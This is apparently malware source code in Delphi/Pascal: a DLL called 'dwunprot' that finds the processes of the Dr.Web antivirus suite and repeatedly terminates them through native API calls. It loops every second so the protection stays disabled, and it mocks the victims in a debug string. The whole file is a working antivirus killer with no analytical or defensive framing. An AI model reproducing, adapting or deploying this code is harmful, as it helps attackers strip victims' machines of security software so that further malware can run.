{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$O-}
{$IFDEF minimum}
program dwunprot;
{$ENDIF}
unit dwunprot;
interface

uses
  Windows, WinNative, RTL, LDasm, Loader;


implementation

const
  DrWebProcessesMax = 8;

  String5: PWideChar = '\BaseNamedObjects\dwunprotwait';
  String6: PWideChar = 'dwunprot.dll';
  String7: PWideChar = 'Yeah suckers!';
  DrWebProcesses: array[0..DrWebProcessesMax] of PWideChar = (
    'dwengine.exe', 'drweb32w.exe', 'spiderml.exe', 'spidernt.exe', 'spiderui.exe',
    'spidergate.exe', 'spideragent.exe', 'drwebupw.exe', 'frwl_notify.exe');

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

var
  DrWebID: array[0..DrWebProcessesMax] of DWORD;
  ProcessHandles: array[0..29] of THANDLE;

  buf1: LBuf;

  ProcessHandlesCount: integer = 0;
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;

  modinf: SYSINFO_BUFFER;
  bytesIO: ULONG;

  EventHandle: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;


function FillProcessesArray(): boolean;
var
  h2: THANDLE;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  ProcessHandlesCount := 0;
  memzero(@DrWebID, sizeof(DrWebID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        if (last = DrWebProcessesMax) then break;
        for i := 0 to DrWebProcessesMax do
        begin
          if (strcmpiW(pBuffer.szExeFile, DrWebProcesses[i]) = 0) then
          begin
            DrWebID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to Integer(buf^.uHandleCount) - 1 do
      if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) then
      begin
        if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then //Process Type Object ID
        begin

          h2 := buf^.rHandleTable[c].Handle;
          if (ZwQueryInformationProcess(h2, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
          begin
            for i := 0 to DrWebProcessesMax do
            begin
              if (pbi.UniqueProcessId = DrWebID[i]) then
              begin
                ProcessHandles[ProcessHandlesCount] := h2;
                inc(ProcessHandlesCount);
              end;
            end;
          end;

        end;
      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
  result := (ProcessHandlesCount > 0);
end;

procedure KillProcesses();
var
  i: integer;
begin
  for i := 0 to ProcessHandlesCount - 1 do
  begin
    ZwTerminateProcess(ProcessHandles[i], 0);
    ZwClose(ProcessHandles[i]);
  end;
end;

const
  String8: PWideChar = #20'Elvis has left the building';

procedure main();
begin
  EventHandle := 0;
  RtlInitUnicodeString(@str1, String5);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
  begin
    if (FillProcessesArray()) then
    begin
      KillProcesses();
      ZwSetEvent(EventHandle, nil);
      ZwClose(EventHandle);

      while (true) do
      begin
        NtSleep(1000);
        if (FillProcessesArray()) then
        begin
          KillProcesses();
          OutputDebugStringW(String7);
        end;
      end;
    end;
  end;
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

